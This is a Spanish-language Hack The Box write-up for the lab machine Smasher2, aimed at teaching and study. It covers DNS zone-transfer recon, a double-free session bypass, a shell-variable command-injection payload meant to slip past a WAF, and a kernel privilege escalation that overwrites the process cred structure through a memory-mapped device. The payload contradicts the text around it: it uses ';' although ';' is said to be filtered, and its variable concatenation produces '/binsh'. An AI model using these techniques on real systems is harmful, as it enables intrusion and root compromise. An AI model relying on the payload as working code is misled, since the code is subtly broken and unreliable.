---
machine: Smasher2
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, web, dns, pwn, kernel, privesc]
---

# Smasher2 — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

`/backup/` entrega el código fuente y `ses.so`, una extensión de sesiones personalizada. El DNS permite AXFR y revela un panel interno. Un fallo de refcount en `ses.so` permite saltarse la autenticación, obtener la API key y usar una inyección de comandos en la API; la ofuscación con variables de shell evade el WAF y da shell como `dzonerzy`. `/dev/dhid` permite mapear memoria del kernel y sobrescribir la estructura `cred` para ser root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,53,80 <IP>
```

- `22` SSH, `53` DNS y `80` Apache con un panel de login.
- `dig axfr smasher2.htb @<IP>` devuelve `admin.smasher2.htb` y otros nombres.
- `http://<IP>/backup/` lista un ZIP con el código y `ses.so`.

## Enumeración

- El código muestra una API en `/api/` que usa `ses.so` para serializar sesiones.
- `ses.so` contiene una estructura con un contador de referencias y una función de limpieza.
- El panel interno expone `/api/user` y `/api/command`.

## Foothold

Se envía una cookie de sesión manipulada que provoca un doble `free` en `ses.so`; el objeto liberado se reutiliza y la comprobación de autenticación se salta. Con la sesión de administrador se lee la API key y se llama a `/api/command`.

```bash
python3 exploit.py --url http://admin.smasher2.htb --cookie '<SESSION>'
```

La API filtra `;`, `|` y espacios; se concatenan variables de shell y se usa `${IFS}` para ejecutar comandos.

```bash
curl -s -H 'X-API-KEY: <KEY>' 'http://admin.smasher2.htb/api/command?cmd=a=${PATH:0:1};b=bin;c=sh;$a$b$c'
```

## Movimiento lateral

La shell es `dzonerzy`. La enumeración muestra `/dev/dhid`, un dispositivo creado por un módulo vulnerable que permite `mmap` sobre memoria física.

```bash
ls -l /dev/dhid
dmesg | tail
```

## Escalada de privilegios

Se mapea `/dev/dhid` en espacio de usuario y se busca la estructura `cred` del proceso actual. Al escribir `uid=0` y `gid=0` en las credenciales, el proceso pasa a root sin necesidad de un binario SUID.

```c
int fd = open("/dev/dhid", O_RDWR);
void *map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
// localizar cred y sobrescribir uid/gid
```

## Evidencia

- ZIP de `/backup/` con `ses.so` y código de la API.
- AXFR y vhost `admin.smasher2.htb`.
- Cookie manipulada y API key obtenida.
- `/dev/dhid` mapeado y `cred` modificada a UID 0.

## Lecciones aprendidas

- Una extensión nativa de sesiones puede introducir corrupción de memoria explotable.
- El DNS interno revela paneles que no aparecen en el escaneo web.
- Un dispositivo que mapea memoria física rompe todo el modelo de privilegios.

## Mitigación y detección

- Revisar código C de extensiones y usar sesiones firmadas del framework.
- Restringir AXFR y separar paneles internos.
- Eliminar módulos que exponen memoria y aplicar SMEP/SMAP/KASLR.

## Referencias

- [0xdf — Smasher2](https://0xdf.gitlab.io/2019/12/14/htb-smasher2.html)
- [IppSec — Smasher2](https://www.youtube.com/watch?v=ELiicja60jI)
- [Hack The Box — Smasher2](https://app.hackthebox.com/machines/smasher2)
